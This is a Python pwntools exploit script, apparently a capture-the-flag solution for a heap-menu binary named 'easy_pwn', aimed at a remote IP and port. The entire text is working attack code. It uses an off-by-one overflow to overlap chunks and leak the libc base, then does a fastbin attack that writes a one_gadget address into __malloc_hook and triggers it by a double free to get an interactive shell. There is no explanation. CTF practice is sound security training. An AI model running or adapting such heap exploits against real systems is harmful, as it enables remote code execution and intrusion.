from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(size):
	cmd(1)
	cmd(size)
def edit(idx,size,c):
	cmd(2)
	cmd(idx)
	cmd(size)
	p.sendafter(": ",c)
def show(idx):
	cmd(4)
	cmd(idx)
def free(idx):
	cmd(3)
	cmd(idx)
context.log_level='debug'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p=process('./easy_pwn')
p=remote("39.97.182.233",35554)
add(0x88)#0
add(0x68)#1
add(0x68)#2
free(0)
add(0x18)#0
edit(0,0x18+10,"A"*0x18+"\xe1")
add(0x68)#3
show(1)
p.readuntil(": ")
base=u64(p.read(8))-(0x7ffff7dd1b78-0x7ffff7a0d000)
log.warning(hex(base))
libc.address=base
add(0x68)#4
free(1)
free(2)
free(4)
add(0x68)#1
edit(1,8,p64(libc.sym['__malloc_hook']-35))
add(0x68)#2 1
add(0x68)#4
add(0x68)#5 1
one=base+0xf02a4
edit(5,19+8,'\x00'*19+p64(one))
free(2)
free(5)
#gdb.attach(p,'')
p.interactive()
